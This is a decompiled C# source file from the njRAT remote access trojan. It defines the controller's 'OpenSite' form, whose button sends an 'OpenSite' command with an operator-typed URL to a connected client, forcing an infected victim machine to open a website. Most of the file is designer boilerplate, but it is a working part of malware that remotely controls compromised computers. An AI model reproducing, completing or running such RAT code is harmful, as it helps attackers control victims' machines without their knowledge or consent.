using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using NJRAT.My;
using NJRAT.NJRAT;

namespace NJRAT
{
	// Token: 0x0200001F RID: 31
	[DesignerGenerated]
	public partial class OpenSite : Form
	{
		// Token: 0x06000445 RID: 1093 RVA: 0x0016CA28 File Offset: 0x0016AE28
		[DebuggerNonUserCode]
		public OpenSite()
		{
			OpenSite.__ENCAddToList(this);
			this.InitializeComponent();
		}

		// Token: 0x06000446 RID: 1094 RVA: 0x0016CA40 File Offset: 0x0016AE40
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = OpenSite.__ENCList;
			lock (_ENCList)
			{
				bool flag = OpenSite.__ENCList.Count == OpenSite.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = OpenSite.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = OpenSite.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								OpenSite.__ENCList[num] = OpenSite.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					OpenSite.__ENCList.RemoveRange(num, OpenSite.__ENCList.Count - num);
					OpenSite.__ENCList.Capacity = OpenSite.__ENCList.Count;
				}
				OpenSite.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x17000189 RID: 393
		// (get) Token: 0x06000449 RID: 1097 RVA: 0x0016CE9C File Offset: 0x0016B29C
		// (set) Token: 0x0600044A RID: 1098 RVA: 0x0016CEB4 File Offset: 0x0016B2B4
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x1700018A RID: 394
		// (get) Token: 0x0600044B RID: 1099 RVA: 0x0016CEC0 File Offset: 0x0016B2C0
		// (set) Token: 0x0600044C RID: 1100 RVA: 0x0016CED8 File Offset: 0x0016B2D8
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x1700018B RID: 395
		// (get) Token: 0x0600044D RID: 1101 RVA: 0x0016CEE4 File Offset: 0x0016B2E4
		// (set) Token: 0x0600044E RID: 1102 RVA: 0x0016CEFC File Offset: 0x0016B2FC
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= eventHandler;
				}
				this._Button1 = value;
				flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click += eventHandler;
				}
			}
		}

		// Token: 0x0600044F RID: 1103 RVA: 0x0016CF5C File Offset: 0x0016B35C
		private void Button1_Click(object sender, EventArgs e)
		{
			NewLateBinding.LateCall(this.s, null, "Send", new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject("OpenSite", MyProject.Forms.Form1.Yy), this.TextBox1.Text) }, null, null, null, true);
		}

		// Token: 0x040001FC RID: 508
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x040001FE RID: 510
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x040001FF RID: 511
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x04000200 RID: 512
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000201 RID: 513
		public Client s;
	}
}
